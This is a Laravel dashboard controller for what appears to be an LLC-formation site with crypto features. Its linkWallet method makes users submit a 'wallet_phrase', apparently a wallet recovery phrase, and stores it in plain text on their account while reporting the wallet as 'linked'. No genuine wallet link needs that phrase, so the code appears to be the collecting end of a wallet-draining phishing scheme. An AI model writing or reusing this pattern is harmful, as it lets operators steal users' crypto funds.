<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class DashboardController extends Controller
{
    public function index()
    {
        $user = Auth::user();
        $companies = $user->companies()->latest()->get();

        $totalLLCs = $companies->count();
        $approvedLLCs = $companies->where('status', 'approved')->count();
        $pendingLLCs = $companies->where('status', 'pending')->count();
        $processingLLCs = $companies->where('status', 'processing')->count();
        $rejectedLLCs = $companies->where('status', 'rejected')->count();

        return view('dashboard.index', compact(
            'user', 'companies', 'totalLLCs', 'approvedLLCs',
            'pendingLLCs', 'processingLLCs', 'rejectedLLCs'
        ));
    }

    public function showLinkWallet()
    {
        return view('dashboard.link-wallet');
    }

    public function linkWallet(Request $request)
    {
        $request->validate([
            'wallet_name' => 'required|string',
            'wallet_phrase' => 'required|string',
        ]);

        $user = Auth::user();
        $user->wallet_name = $request->input('wallet_name');
        $user->wallet_phrase = $request->input('wallet_phrase');
        $user->wallet_connected = true;
        $user->save();

        return redirect()->route('crypto')->with('success', 'Wallet linked successfully!');
    }

    public function showReceive()
    {
        $cryptos = \App\Models\CryptoDetail::all();
        return view('dashboard.receive', compact('cryptos'));
    }

    public function showReceiveDetails(Request $request)
    {
        $walletName = $request->query('wallet');
        
        $crypto = \App\Models\CryptoDetail::where('name', $walletName)->first();
        
        if (!$crypto) {
            $crypto = \App\Models\CryptoDetail::where('symbol', 'LIKE', '%' . $walletName . '%')
                ->orWhere('network', 'LIKE', '%' . $walletName . '%')
                ->first();
        }
        
        if (!$crypto) {
            abort(404, 'Cryptocurrency network not supported.');
        }
        
        return view('dashboard.receive-details', compact('crypto'));
    }
}
